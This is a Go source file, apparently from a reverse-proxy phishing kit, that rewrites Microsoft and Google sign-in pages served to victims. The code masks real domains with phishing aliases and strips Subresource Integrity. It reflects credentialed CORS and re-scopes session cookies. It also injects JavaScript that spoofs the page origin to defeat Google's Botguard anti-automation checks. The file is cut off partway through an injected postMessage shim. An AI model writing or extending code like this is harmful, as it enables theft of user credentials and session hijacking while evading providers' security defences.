package proxy

import (
	"bytes"
	"fmt"
	"io"
	"net"
	"net/http"
	"regexp"
	"strconv"
	"strings"
	"sync"

	"github.com/user/evilpikin/internal/storage"
)

// RewriteContext carries the immutable inputs a transformer needs to mask a
// response for a given target/host route.
type RewriteContext struct {
	Target    *storage.TargetProfile
	Pairs     []DomainPair
	Port      int // public TLS port (443, or non-standard like 9443 in dev)
	CookieJar *CookieJar
	// BaseDomain is the phishing base domain. When set together with
	// DynamicAlias, external hosts referenced in HTML that no routing_matrix
	// entry covers are auto-aliased to <host>.<BaseDomain>.
	BaseDomain string
	// SiteDomain is the PER-TARGET cookie scope domain (e.g. "google.test" for
	// foreign-suffix targets, else BaseDomain). It drives cookie Domain
	// rewriting and the JS cookie shim; BaseDomain remains the global alias
	// namespace for external hosts.
	SiteDomain string
	// DynamicAlias maps an arbitrary external origin host to its phishing alias
	// (and records it for inbound resolution). It returns ("", false) when
	// dynamic aliasing is unavailable or the host is already an alias.
	DynamicAlias func(origin string) (string, bool)
	// GlobalAlias is the engine-wide real-origin -> phishing-origin map across
	// ALL loaded targets. It powers the postMessage origin shim so any served
	// frame can rewrite a sibling target's origin, not just its own.
	GlobalAlias map[string]string
	// IsPhishHost reports whether an absolute-URL host is one of OUR phishing
	// routes (possibly on a foreign suffix, e.g. google.test). Such hosts are
	// served directly by host routes and must never be re-aliased into
	// <host>.<BaseDomain> (which the inbound side would resolve back to an
	// unresolvable host → 502 Bad Gateway).
	IsPhishHost func(host string) bool
}

// ResponseTransformer rewrites an upstream HTTP response before it is flushed to
// the victim. Implementations MUST stay on the synchronous fast path: the live
// stream must never block on an external service. A future async AI component
// may only update shared rule caches out-of-band, never sit in this call.
type ResponseTransformer interface {
	Transform(resp *http.Response, rc *RewriteContext) error
}

// RulesCache is a thread-safe store of compiled rewrite state keyed by target
// ID. The fast path consults it first so identical traffic never re-parses; a
// background AI loop (future) can populate it without touching live bytes.
type RulesCache struct {
	mu sync.RWMutex
	m  map[string]map[string]string
}

// NewRulesCache returns an empty, concurrency-safe rules cache.
func NewRulesCache() *RulesCache { return &RulesCache{m: make(map[string]map[string]string)} }

// Get returns the cached translation set for a target, if present.
func (c *RulesCache) Get(id string) (map[string]string, bool) {
	c.mu.RLock()
	defer c.mu.RUnlock()
	v, ok := c.m[id]
	return v, ok
}

// Put stores the translation set for a target.
func (c *RulesCache) Put(id string, t map[string]string) {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.m[id] = t
}

// StaticTransformer performs classic, deterministic domain masking + injection.
// It is the always-available fallback and the default path today; it depends on
// no external service and is therefore un-crashable and zero-latency.
type StaticTransformer struct {
	cache *RulesCache
}

// NewStaticTransformer builds a static transformer backed by the given cache.
func NewStaticTransformer(cache *RulesCache) *StaticTransformer {
	return &StaticTransformer{cache: cache}
}

// Transform rewrites response headers (cookies, Location) and the response body
// (domain masking + injections + subfilters) in place.
func (t *StaticTransformer) Transform(resp *http.Response, rc *RewriteContext) error {
	for _, h := range stripResponseHeaders {
		resp.Header.Del(h)
	}
	// Force the victim's browser to never cache our (rewritten) assets. Without
	// this, Microsoft's multi-year Cache-Control on its CDN bundles would let a
	// transiently-corrupted response (e.g. a JS bundle mangled by a transform
	// bug) be cached under its content-hashed URL and served back for months,
	// poisoning every subsequent page load even after the server is fixed.
	resp.Header.Set("Cache-Control", "no-store")
	resp.Header.Set("Pragma", "no-cache")
	// Reflect CORS so the victim's browser accepts cross-subdomain fetches
	// between our phishing hosts (e.g. login.ms.test -> login-live.ms.test for
	// the MSA/personal-account realm). Microsoft's responses carry
	// Access-Control-Allow-Origin for the REAL origin, so without this the
	// browser blocks the cross-origin XHR and the SPA shows a generic
	// "Something went wrong" (the core account data still loads, which is why
	// "sign in with another way" still works).
	if origin := corsOrigin(resp); origin != "" {
		for _, h := range []string{
			"Access-Control-Allow-Origin",
			"Access-Control-Allow-Credentials",
			"Access-Control-Allow-Methods",
			"Access-Control-Allow-Headers",
			"Access-Control-Expose-Headers",
		} {
			resp.Header.Del(h)
		}
		resp.Header.Set("Access-Control-Allow-Origin", origin)
		resp.Header.Set("Access-Control-Allow-Credentials", "true")
		// Reflect exactly what the browser requested. Credentialed preflights
		// reject the "*" wildcard for Allow-Headers/Methods (Chrome: "field
		// cache-control is not allowed by Access-Control-Allow-Headers"), so we
		// must echo the actual requested values or the XHR is blocked.
		if m := strings.TrimSpace(resp.Request.Header.Get("Access-Control-Request-Method")); m != "" {
			resp.Header.Set("Access-Control-Allow-Methods", m)
		} else {
			resp.Header.Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
		}
		if h := strings.TrimSpace(resp.Request.Header.Get("Access-Control-Request-Headers")); h != "" {
			resp.Header.Set("Access-Control-Allow-Headers", h)
		} else {
			resp.Header.Set("Access-Control-Allow-Headers", "*")
		}
		if resp.Request != nil && resp.Request.Method == "OPTIONS" {
			resp.StatusCode = http.StatusNoContent
			resp.Body = io.NopCloser(bytes.NewReader(nil))
			resp.ContentLength = 0
			resp.Header.Del("Content-Length")
		}
	}
	siteDomain := rc.SiteDomain
	if siteDomain == "" {
		siteDomain = rc.BaseDomain // defensive fallback
	}
	rewriteCookieDomains(resp, rc.Pairs, siteDomain)
	captured := false
	if rc.CookieJar != nil && resp.Request != nil {
		if sc, err := resp.Request.Cookie("__ep_sid"); err == nil && sc.Value != "" {
			captured = rc.CookieJar.IsCaptured(sc.Value)
		}
	}
	rewriteLocation(resp, rc.Pairs, rc.Port, rc.BaseDomain, captured, rc.IsPhishHost)
	// Transport has already auto-decompressed the body and stripped
	// Content-Encoding; decodeResponseBody is a safety net for any stray
	// gzip/deflate/zlib encoding before the domain-mask / injection readers
	// operate on plaintext.
	decodeResponseBody(resp)
	if rc.CookieJar != nil {
		rc.CookieJar.OnResponse(rc.Target, resp, resp.Request)
	}

	ct := resp.Header.Get("Content-Type")
	// Only buffer + mask content types that can carry host references. Images,
	// fonts, etc. are passed through untouched (and would be corrupted by the
	// 8MB read cap if we buffered them unconditionally).
	if !isMaskable(ct) {
		return nil
	}

	// Buffer the response (phishing pages/assets are small) and rewrite every
	// scheme-prefixed host to its phishing alias in a SINGLE left-to-right
	// pass. A single pass is essential: a dynamic alias embeds the origin
	// (<host>.<BaseDomain>), so a multi-pass map replace would re-match the
	// produced alias and double-expand it.
	raw, err := io.ReadAll(io.LimitReader(resp.Body, 8<<20))
	if err != nil || len(raw) == 0 {
		// Could not safely buffer; serve the decoded body untouched.
		if err != nil {
			resp.Body = io.NopCloser(bytes.NewReader(raw))
		}
		resp.ContentLength = int64(len(raw))
		return nil
	}

	aliasOf := buildAliasMap(rc.Pairs, proxyPortString(rc.Port))
	if rc.DynamicAlias != nil && rc.BaseDomain != "" {
		extendAliasMapDynamic(raw, aliasOf, rc)
		// Self-healing host discovery: alias ANY external host named in the
		// response HEADERS (Link preloads, CORS allow-origin, CSP src directives,
		// and Set-Cookie Domain attributes) even when it is not textually present
		// in the body. Microsoft frequently bootstraps loaders (e.g. the SystemJS
		// `System` global on /common/reprocess) via <link rel=preload> or a
		// worker that fetches a CDN host the HTML never references — if those
		// hosts are not aliased, the browser fetches them from the real origin,
		// the script never defines `System`, and the page throws
		// "System is not defined". Registering them here keeps the whole chain
		// in-proxy with zero per-target tuning.
		extendAliasFromHeaders(resp, aliasOf, rc)
	}

	isHTML := strings.Contains(ct, "text/html")
	if isHTML {
		// Strip Subresource Integrity so the browser accepts our (possibly
		// rewritten) proxied JS/CSS instead of refusing it for a hash mismatch.
		raw = stripIntegrity(raw)
	}
	// Protect redirect/callback URI parameters (wreply, redirect_uri, ...) from
	// aliasing: Microsoft validates these against the app's registered URIs, so
	// their host must stay the real origin. Aliasing them to our phishing domain
	// triggers errors like "Invalid BrsConfig URL" on the password-reset page.
	raw, protected := protectCallbackURLs(raw)
	raw = rewriteHTMLHosts(raw, aliasOf)
	if isHTML {
		siteDomainFallback := rc.SiteDomain
		if siteDomainFallback == "" {
			siteDomainFallback = rc.BaseDomain
		}
		raw = injectCookieShim(raw, siteDomainFallback, originAliasMap(rc), realOriginFor(rc), spoofFor(rc))
		// Prevent the browser from caching the (shim-injected) HTML: a cached
		// pre-shim page would keep throwing the postMessage origin error and stall
		// the sign-in SPA even after the proxy is fixed.
		resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate")
		resp.Header.Set("Pragma", "no-cache")
	}
	raw = restoreCallbackURLs(raw, protected)


	var body io.Reader = bytes.NewReader(raw)
	if isHTML {
		if len(rc.Target.Injections) > 0 {
			body = NewInjectionReader(body, rc.Target.Injections, resp.Request.URL.Path)
		}
		if len(rc.Target.SubFilters) > 0 {
			body = NewSubFilterReader(body, rc.Target.SubFilters)
		}
	}
	resp.Body = io.NopCloser(body)
	resp.ContentLength = -1
	resp.Header.Del("Content-Length")
	return nil
}

// isMaskable reports whether a response body may carry host references that
// need domain masking.
func isMaskable(ct string) bool {
	return strings.Contains(ct, "text/html") ||
		strings.Contains(ct, "javascript") ||
		strings.Contains(ct, "application/json") ||
		strings.Contains(ct, "text/json") ||
		strings.Contains(ct, "text/css") ||
		strings.Contains(ct, "application/xml") ||
		strings.Contains(ct, "text/xml") ||
		strings.Contains(ct, "image/svg+xml") ||
		// Google's sign-in batchexecute RPC returns JSON-like payloads with
		// Content-Type text/plain; without masking them we cannot rewrite the
		// identifier-lookup "rejected" navigation response.
		strings.Contains(ct, "text/plain")
}

// integrityRE matches a Subresource Integrity attribute (double or single
// quoted). It is removed from HTML so the browser does not reject our
// (rewritten) proxied scripts/stylesheets for a hash mismatch.
var integrityRE = regexp.MustCompile(`(?i)\s+integrity\s*=\s*("([^"]*)"|'([^']*)')`)

// corsOrigin returns the Origin to reflect in CORS responses. The browser only
// sends an Origin header on cross-origin requests, so its presence is exactly
// the signal that the response needs permissive (reflected) CORS so the
// victim's subdomains can talk to each other through the proxy. The value is
// taken from the request context (the victim's original Origin), because by the
// time ModifyResponse runs the Origin header has been rewritten to the upstream's
// real origin.
func corsOrigin(resp *http.Response) string {
	if resp == nil || resp.Request == nil {
		return ""
	}
	if o, ok := resp.Request.Context().Value(clientOriginCtxKey).(string); ok {
		if s := strings.TrimSpace(o); s != "" {
			return s
		}
	}
	return strings.TrimSpace(resp.Request.Header.Get("Origin"))
}

func stripIntegrity(raw []byte) []byte {
	return integrityRE.ReplaceAll(raw, []byte(""))
}

// buildAliasMap returns origin->aliasWithPort for the target's matrix pairs
// (routing_matrix / proxy_hosts). Matrix aliases are short and never embed the
// origin, so they are safe to apply in any order.
func buildAliasMap(pairs []DomainPair, portStr string) map[string]string {
	m := make(map[string]string)
	for _, p := range pairs {
		if p.Origin == "" || p.ProxyHost == "" {
			continue
		}
		ph := p.ProxyHost
		if portStr != "" && portStr != "443" {
			ph = net.JoinHostPort(ph, portStr)
		}
		// Transparent mode (proxy_host == origin): the victim reaches the real
		// origin through a tunnel/DNS intercept, so the served page must keep the
		// genuine host with NO listener port. Appending the port (e.g. :9443)
		// would leak it into the SPA's RPC base URLs, breaking origin-bound
		// tokens (Google's `at`) and forcing HTTP 400 on every batchexecute call.
		if p.ProxyHost == p.Origin {
			ph = p.Origin
		}
		m[strings.ToLower(p.Origin)] = ph
	}
	return m
}

// htmlHostRE matches a scheme-prefixed host: "https://host", "http://host",
// "wss://host"/"ws://host" (live dashboards stream over WebSocket), or "//host"
// (protocol-relative). Group 1 is the scheme prefix, group 2 the host (which may
// carry a port). Matching ws(s) URLs is essential to the "alias every ecosystem
// host" guarantee: a dashboard's live socket must be pulled into the phishing
// namespace too, or the victim's real-time connection escapes the proxy.
var htmlHostRE = regexp.MustCompile(`(https?://|wss?://|//)([^/"'\s>]+)`)

// encodedHostRE matches a percent-encoded scheme+host such as
// "https%3a%2f%2flogin.microsoftonline.com". Microsoft embeds these inside JSON
// config blobs and query/return parameters (ru=, wreply=, iframed_by=). The
// literal htmlHostRE above cannot see them (the "://" is percent-encoded), so
// without this pass those references keep the REAL origin and bounce the victim
// out of the proxy after login. We rewrite only the host, preserving the encoded
// scheme separators so the value stays a valid percent-encoded URL.
var encodedHostRE = regexp.MustCompile(`(?i)(https?)(%3a%2f%2f)([a-zA-Z0-9.-]+)`)

// bareHostRE matches a quoted (optionally leading-dot) Microsoft-ecosystem host
// with NO scheme, e.g. ".login.microsoftonline.com" inside a JSON domain
// allowlist/array. htmlHostRE cannot see these (no "://"), so without this pass
// the real origin survives in the page and the victim's browser can fail a
// domain-membership or env-error check against the phishing host.
var bareHostRE = regexp.MustCompile(`(["'])([.]?)([a-z0-9-]+\.(?:microsoftonline\.com|msauth\.net|live\.com|office\.com|microsoft\.com))(["'])`)

// extendAliasMapDynamic scans the HTML for external hosts and, for any not
// already covered by a matrix pair, registers a <host>.<BaseDomain> alias so
// the victim's browser keeps loading them through the proxy.
func extendAliasMapDynamic(raw []byte, m map[string]string, rc *RewriteContext) {
	portStr := proxyPortString(rc.Port)
	for _, mm := range htmlHostRE.FindAllSubmatch(raw, -1) {
		host := string(mm[2])
		if h, _, err := net.SplitHostPort(host); err == nil {
			host = h
		}
		lh := strings.ToLower(host)
		if lh == "" {
			continue
		}
		// Only alias plausible internet domain names. The loose htmlHostRE also
		// matches "//" inside JavaScript (e.g. the "//" of a `//.*` comment
		// regex literal, or other code tokens), and aliasing those would
		// corrupt the script (SyntaxError: Unexpected token '.'). Rejecting
		// anything that is not a strict domain name keeps CDN/host references
		// aliased while leaving code untouched.
		if !looksLikeDomain(lh) {
			continue
		}
		if isNonResourceHost(lh) {
			continue // XML-namespace / RDF identifier, not a fetchable host
		}
		if _, ok := m[lh]; ok {
			continue
		}
		if strings.HasSuffix(lh, "."+rc.BaseDomain) {
			continue // already a phishing alias
		}
		if alias, ok := rc.DynamicAlias(lh); ok && alias != "" {
			a := alias
			if portStr != "" && portStr != "443" {
				a = net.JoinHostPort(alias, portStr)
			}
			m[lh] = a
		}
	}
}

// headerCookieDomainRE extracts the host from a Set-Cookie `Domain=` attribute
// so self-healing can alias hosts that only ever appear in cookie scope.
var headerCookieDomainRE = regexp.MustCompile(`(?i)domain=([a-z0-9][a-z0-9.-]*[a-z])`)

// extendAliasFromHeaders scans response headers that can name external hosts and
// registers a <host>.<BaseDomain> alias for each, so the victim's browser (or a
// worker it spawns) keeps loading them through the proxy. Covered headers:
//   - Link                 (e.g. <https://cdn/loader.js>; rel=preload)
//   - Access-Control-Allow-Origin (cross-origin script/CORS hosts)
//   - Content-Security-Policy / X-Content-Security-Policy (connect/src hosts)
//   - Set-Cookie           (Domain= attributes reveal related auth hosts)
//
// This is the heart of the self-healing layer: a target that introduces a new
// CDN/loader host (e.g. Microsoft spinning up a new aadcdn fleet) is proxied
// automatically on first contact, with no routing_matrix edit.
func extendAliasFromHeaders(resp *http.Response, m map[string]string, rc *RewriteContext) {
	portStr := proxyPortString(rc.Port)
	aliasHost := func(host string) {
		if host == "" {
			return
		}
		if h, _, err := net.SplitHostPort(host); err == nil {
			host = h
		}
		lh := strings.ToLower(host)
		if lh == "" || !looksLikeDomain(lh) {
			return
		}
		if isNonResourceHost(lh) {
			return // XML-namespace / RDF identifier, not a fetchable host
		}
		if _, ok := m[lh]; ok {
			return
		}
		if strings.HasSuffix(lh, "."+rc.BaseDomain) {
			return
		}
		if alias, ok := rc.DynamicAlias(lh); ok && alias != "" {
			a := alias
			if portStr != "" && portStr != "443" {
				a = net.JoinHostPort(alias, portStr)
			}
			m[lh] = a
		}
	}
	for _, hname := range []string{
		"Link",
		"Access-Control-Allow-Origin",
		"Content-Security-Policy",
		"X-Content-Security-Policy",
	} {
		for _, v := range resp.Header.Values(hname) {
			for _, mm := range htmlHostRE.FindAllStringSubmatch(v, -1) {
				aliasHost(mm[2])
			}
		}
	}
	for _, c := range resp.Header.Values("Set-Cookie") {
		for _, dm := range headerCookieDomainRE.FindAllStringSubmatch(c, -1) {
			aliasHost(dm[1])
		}
	}
}

// looksLikeDomain reports whether s is a plausible internet domain name
// (e.g. "aadcdn.msauth.net"). It rejects tokens that merely resemble a host
// because of the loose htmlHostRE match — regex metacharacters, paths, query
// strings, or single-label strings — which must never be aliased.
func looksLikeDomain(s string) bool {
	if s == "" || !strings.Contains(s, ".") {
		return false
	}
	if strings.ContainsAny(s, "[](){}*+?\\^$|/`\"'<>;, \t\n\r") {
		return false
	}
	labels := strings.Split(s, ".")
	if len(labels) < 2 {
		return false
	}
	for _, l := range labels {
		if l == "" || len(l) > 63 {
			return false
		}
		for _, c := range l {
			if !((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
				(c >= '0' && c <= '9') || c == '-') {
				return false
			}
		}
		if l[0] == '-' || l[len(l)-1] == '-' {
			return false
		}
	}
	tld := labels[len(labels)-1]
	if len(tld) < 2 {
		return false
	}
	for _, c := range tld {
		if !((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z')) {
			return false
		}
	}
	return true
}

// nonResourceHosts are XML-namespace / semantic-web identifiers that appear in
// response bodies (e.g. <svg xmlns="http://www.w3.org/2000/svg">) and headers
// but are NEVER fetched as resources by the browser. Aliasing them to
// <host>.<BaseDomain> corrupts the identifier (the SVG stops being recognized
// as an image -> the page reports "Failed to load external resource"). They must
// be left untouched.
var nonResourceHosts = map[string]bool{
	"w3.org": true, "www.w3.org": true,
	"xml.org": true, "www.xml.org": true,
	"schema.org": true, "www.schema.org": true,
	"purl.org": true, "www.purl.org": true,
	"rdfs.org": true, "www.rdfs.org": true,
	"ogp.me": true, "www.ogp.me": true,
}

func isNonResourceHost(lh string) bool {
	if nonResourceHosts[lh] {
		return true
	}
	for _, z := range []string{"w3.org", "xml.org", "schema.org", "purl.org", "rdfs.org", "ogp.me"} {
		if strings.HasSuffix(lh, "."+z) {
			return true
		}
	}
	return false
}

// callbackParamRE matches query/JSON parameter names whose value is a redirect
// or callback URL. MOST of these (OAuth redirect_uri, post_logout_redirect_uri,
// return_url, next, ...) must keep their REAL origin in the proxied response so
// the upstream (Microsoft) server-side validation sees a registered URI.
//
// Two parameters are deliberately EXCLUDED: `wreply` and `reply` (the Microsoft
// password-reset / reply URLs). For those, the host MUST be aliased to the
// phishing domain so the victim's browser sees a same-host URL and Microsoft's
// client-side BrsConfig validation — which otherwise crashes the reset page
// with "Invalid BrsConfig URL" on a host mismatch — passes. The engine then
// reverse-aliases that host back to the real origin on the inbound request (see
// requestModifier), so Microsoft's server still receives the genuine reply URI.
var callbackParamRE = regexp.MustCompile(`(?i)((?:[?&]|["']?)(?:redirect_uri|redirect_url|redirecturl|post_logout_redirect_uri|response_uri|return_url|returnurl|ru|redirect|next|target|callback|client_redirect)["']?\s*[:=]\s*)(https?://[^"'\s&]+|//[^"'\s&]+)`)

// protectCallbackURLs swaps each callback-parameter URL for a unique
// placeholder so the alias pass cannot rewrite its host. The originals are
// returned for restoration afterwards.
func protectCallbackURLs(raw []byte) ([]byte, [][2][]byte) {
	var held [][2][]byte
	out := callbackParamRE.ReplaceAllFunc(raw, func(m []byte) []byte {
		tok := []byte(fmt.Sprintf("EPPROT%dEPPROT", len(held)))
		held = append(held, [2][]byte{tok, m})
		return tok
	})
	return out, held
}

func restoreCallbackURLs(raw []byte, held [][2][]byte) []byte {
	for _, p := range held {
		raw = bytes.ReplaceAll(raw, p[0], p[1])
	}
	return raw
}

// rewriteHTMLHosts rewrites every scheme-prefixed host in the HTML to its
// phishing alias in a single left-to-right pass. Because the replacement text
// is never re-scanned, an alias that embeds the origin (e.g. the dynamic
// <host>.<BaseDomain> form) cannot be double-expanded by a later match.
func rewriteHTMLHosts(raw []byte, aliasOf map[string]string) []byte {
	raw = htmlHostRE.ReplaceAllFunc(raw, func(match []byte) []byte {
		s := string(match)
		i := strings.Index(s, "//")
		if i < 0 {
			return match
		}
		prefix := s[:i+2]
		rest := s[i+2:]
		// Matrix pairs carry an explicit port (e.g. 127.0.0.1:60413 in tests),
		// so try the full host:port key first, then the host-only key used for
		// port-less dynamic aliases.
		if alias, ok := aliasOf[strings.ToLower(rest)]; ok {
			return []byte(prefix + alias)
		}
		if h, _, err := net.SplitHostPort(rest); err == nil {
			if alias, ok := aliasOf[strings.ToLower(h)]; ok {
				return []byte(prefix + alias)
			}
		}
		return match
	})
	// Second pass: percent-encoded hosts (https%3a%2f%2fhost). See encodedHostRE.
	raw = encodedHostRE.ReplaceAllFunc(raw, func(m []byte) []byte {
		sub := encodedHostRE.FindSubmatch(m)
		if len(sub) < 4 {
			return m
		}
		host := strings.ToLower(string(sub[3]))
		alias, ok := aliasOf[host]
		if !ok {
			if h, _, err := net.SplitHostPort(host); err == nil {
				alias, ok = aliasOf[h]
			}
		}
		if !ok {
			return m
		}
		return append(append([]byte(string(sub[1])), sub[2]...), []byte(alias)...)
	})
	// Third pass: quoted bare ecosystem hosts (".login.microsoftonline.com").
	raw = bareHostRE.ReplaceAllFunc(raw, func(m []byte) []byte {
		sub := bareHostRE.FindSubmatch(m)
		if len(sub) < 5 {
			return m
		}
		host := strings.ToLower(string(sub[3]))
		alias, ok := aliasOf[host]
		if !ok {
			if h, _, err := net.SplitHostPort(host); err == nil {
				alias, ok = aliasOf[h]
			}
		}
		if !ok {
			return m
		}
		if h, _, err := net.SplitHostPort(alias); err == nil {
			alias = h
		}
		return []byte(string(sub[1]) + string(sub[2]) + alias + string(sub[4]))
	})
	return raw
}

// cookieShimHeadRE matches the opening <head> tag so the cookie-domain shim can
// be installed before any other inline script executes.
var cookieShimHeadRE = regexp.MustCompile(`(?i)<head[^>]*>`)

// injectCookieShim rewrites the `domain` attribute of any document.cookie
// assignment to the phishing site domain. Microsoft's SPA (and the live.com
// consumer flow in particular) frequently set correlation cookies such as
// `uaid`/`MSPCID` via JavaScript rather than a Set-Cookie header. Those cookies
// carry the REAL origin's domain (e.g. login.live.com) which the proxy's
// Set-Cookie rewriter never sees, so the browser stores them for the real host
// and never sends them to the phishing twin — producing upstream errors such as
// "The contextID supplied in the request did not have a matching cookie" on
// /ppsecure/post.srf. Scoping the JS-set cookie to the site domain makes the
// browser attach it to the phishing host, and the session cookie jar replays it
// to every upstream request regardless.
// originAliasMap builds the real-origin -> phishing-origin map for every known
// routing pair (and the base domain). It powers the postMessage origin shim: each
// served frame rewrites postMessage *target* origins (and inbound event.origin
// values) using this full map, not just its own origin — because Google's SPA
// cross-posts between sibling frames (e.g. the youtube CheckConnection frame
// posts to https://accounts.google.com), and a frame that only rewrites its own
// origin would still trip the "target origin does not match" SecurityError.
func originAliasMap(rc *RewriteContext) map[string]string {
	// Prefer the engine-wide map (every target's origins) so a sibling frame can
	// rewrite a different target's origin. Fall back to the per-target pairs when
	// the global map is unavailable.
	if len(rc.GlobalAlias) > 0 {
		return rc.GlobalAlias
	}
	m := make(map[string]string)
	for real, ph := range buildAliasMap(rc.Pairs, proxyPortString(rc.Port)) {
		m["https://"+real] = "https://"+ph
	}
	return m
}


// realOriginFor returns the genuine upstream origin (e.g. https://accounts.google.com)
// for the served target, or "" when unknown. Used by the Botguard origin shim.
// The origin is always the real upstream origin on its standard port (443) — the
// engine's own TLS listen port must NEVER appear here, or the spoofed origin would
// be wrong (e.g. accounts.google.com:9444) and Botguard would still reject.
func realOriginFor(rc *RewriteContext) string {
	if rc == nil || rc.Target == nil || rc.Target.Origin == "" {
		return ""
	}
	return "https://" + rc.Target.Origin
}

// spoofFor reports whether the Botguard origin shim should be installed for this
// target. It is enabled only when the target declares an evilpuppet block, i.e.
// the operator is explicitly fighting Google-style origin-bound anti-automation.
func spoofFor(rc *RewriteContext) bool {
	return rc != nil && rc.Target != nil && rc.Target.EvilPuppet != nil && rc.Target.EvilPuppet.Enabled
}

func injectCookieShim(raw []byte, siteDomain string, realToPhish map[string]string, realOrigin string, spoof bool) []byte {
	if siteDomain == "" {
		return raw
	}
	// Only inject into genuine HTML documents. Bodies mislabeled as HTML (JSON,
	// JS, or plaintext error bodies) would otherwise render the <script> as
	// visible text in the victim's browser — the "shim flashes on screen" symptom
	// the operator reported.
	if !looksLikeHTML(raw) {
		return raw
	}
	// Botguard origin shim (Google v3 / similar). Google's client-side
	// anti-automation binds the challenge token to window.location.origin. A
	// victim on the phishing host (accounts.google.test) therefore mints a token
	// whose embedded origin is the phishing host, which Google rejects ("v3/signin/
	// rejected"). We spoof only the ORIGIN-IDENTIFYING getters (hostname/host/
	// origin/ancestorOrigins) on Location.prototype so Google's own JS computes a
	// token bound to the GENUINE origin (accounts.google.com) while running in the
	// victim's real, non-automated browser. Crucially we do NOT spoof href/
	// pathname/search, so relative fetches still resolve against the real
	// (phishing) document base URL and the victim stays in-proxy. A separate
	// headless solver cannot defeat this (its token is session/browser-bound and
	// is itself rejected), so the token MUST come from the victim's own browser.
	if spoof && realOrigin != "" {
		host := strings.TrimPrefix(realOrigin, "https://")
		spoofJS := fmt.Sprintf(
			"(function(){"+
				"try{"+
				"var R=%s;"+
				"var H=%s;"+
				"var Lp=(typeof Location!=='undefined')?Location.prototype:null;"+
				"if(Lp){"+
				"function sp(n,v){try{Object.defineProperty(Lp,n,{configurable:true,get:function(){return v;}});}catch(e){}}"+
				"sp('hostname',H);"+
				"sp('host',H);"+
				"sp('origin',R);"+
				"try{Object.defineProperty(Lp,'ancestorOrigins',{configurable:true,get:function(){return [R];}});}catch(e){}"+
				"}"+
				"try{Object.defineProperty(document,'domain',{configurable:true,get:function(){return H;}});}catch(e){}"+
				"}catch(e){}"+
				"})();",
			strconv.Quote(realOrigin), strconv.Quote(host))
		spoofShim := []byte("<script>" + spoofJS + "</script>")
		if loc := cookieShimHeadRE.FindIndex(raw); loc != nil {
			out := make([]byte, 0, len(raw)+len(spoofShim))
			out = append(out, raw[:loc[1]]...)
			out = append(out, spoofShim...)
			out = append(out, raw[loc[1]:]...)
			raw = out
		} else {
			raw = append(spoofShim, raw...)
		}
	}
	// Scope every JS-set cookie (Microsoft sets correlation cookies such as
	// uaid/MSPCID via document.cookie, never Set-Cookie) to the EXACT phishing
	// site domain so the browser attaches them on every phishing subdomain and
	// the session survives the cross-host auth chain. The domain is derived from
	// the configured site domain, not guessed from the hostname, so it is always
	// the correct parent (e.g. ".ms.test") rather than an over-narrow subdomain.
	shim := []byte(fmt.Sprintf(
		"<script>(function(){try{var d='.%s';var pd=Object.getOwnPropertyDescriptor(Document.prototype,'cookie');if(!pd)return;var g=pd.get,s=pd.set;Object.defineProperty(document,'cookie',{configurable:true,get:function(){return g?g.call(document):'';},set:function(v){if(typeof v==='string'){v=v.replace(/;\\s*domain=[^;]+/gi,'; domain='+d);}if(s)s.call(document,v);}});}catch(e){}})();</script>", siteDomain))
	// Origin shim: Google's SPA posts cross-frame messages whose target origin is
	// the REAL origin (e.g. https://accounts.google.com) and validates incoming
	// message events against it. Because the page is actually served from the
	// phishing origin, those postMessage calls throw "target origin does not
	// match" and the message handlers silently drop the events, stalling the
	// sign-in SPA. We rewrite any postMessage target that points at a real origin
	// to the live (phishing) origin, and rewrite inbound event.origin back to the
	// real origin so Google's handlers accept them.
	if len(realToPhish) > 0 {
		parts := make([]string, 0, len(realToPhish))
		for k, v := range realToPhish {
			parts = append(parts, strconv.Quote(k)+":"+strconv.Quote(v))
		}
		obj := "{" + strings.Join(parts, ",") + "}"
		// Origin shim. Google's SPA posts cross-frame messages whose target
		// origin is the REAL origin (e.g. the youtube CheckConnection frame posts
		// to https://accounts.google.com) while the recipient is actually served
		// from the phishing origin — producing the browser's "target origin does
		// not match" SecurityError that stalls the sign-in handshake. We rewrite
		// any real-origin postMessage target to its phishing twin, and rewrite
		// inbound event.origin back to the real origin so Google's handlers
		// accept the messages. The FULL real->phish map is injected into every
		// frame (not just that frame's own origin) so a sibling frame can rewrite
		// targets pointing at a different real origin. Patching Window.prototype
		// (which has no own descriptor in this engine but is redefinable) covers
		// every window in the realm at once; the own-property patch covers the
		// rare window that shadows postMessage.
																shimJS := strings.Replace("(function(){ var REALMAP=__OBJ__; var INVMAP={}; for(var k in REALMAP){ INVMAP[REALMAP[k]]=k; } function fixTarget(t){ if(typeof t!=='string') return t; for(var k in REALMAP){ if(t===k||t.indexOf(k)===0) return REALMAP[k]; } return t; } function install(){ try{ if(typeof Window!=='undefined'&&Window.prototype){ var ppm=Window.prototype.postMessage; if(ppm&&ppm.__ep) return; var native=(typeof ppm==='function')?ppm:function(){}; var wp=function(m,t,tf){ return native.call(this,m,fixTarget(t),tf); }; wp.__ep=true; try{ Object.defineProperty(Window.prototype,'postMessage',{configurable:false,get:function(){return wp;},set:function(){}}); }catch(e){ try{ Object.defineProperty(Window.prototype,'postMessage',{configurable:true,get:function(){return wp;},set:function(){}}); }catch(e2){ try{ Object.defineProperty(Window.prototype,'postMessage',{configurable:true,writable:true,value:wp}); }catch(e3){} } } } }catch(e){} try{ if(typeof window!=='undefined'&&typeof window.postMessage==='function'&&!window.postMessage.__ep){ var wpm=window.postMessage; var ww=function(m,t,tf){ return wpm.call(window,m,fixTarget(t),tf); }; ww.__ep=true; Object.defineProperty(window,'postMessage',{configurable:false,writable:false,value:ww}); } }catch(e){} try{ if(typeof MessagePort!=='undefined'&&MessagePort.prototype&&typeof MessagePort.prototype.postMessage==='function'&&!MessagePort.prototype.postMessage.__ep){ var mpm=MessagePort.prototype.postMessage; var mpf=function(m,t,o){ return mpm.call(this,m,(typeof t==='string')?fixTarget(t):t,o); }; mpf.__ep=true; Object.defineProperty(MessagePort.prototype,'postMessage',{configurable:false,writable:false,value:mpf}); } }catch(e){} try{ var oa=EventTarget.prototype.addEventListener; if(oa&&!oa.__ep){ EventTarget.prototype.addEventListener=function(type,listener,opts){ if(type==='message'||type==='messageerror'){ var wrapper=function(ev){ if(ev&&ev.origin&&INVMAP[ev.origin]){ try{ Object.defineProperty(ev,'origin',{value:INVMAP[ev.origin],configurable:true}); 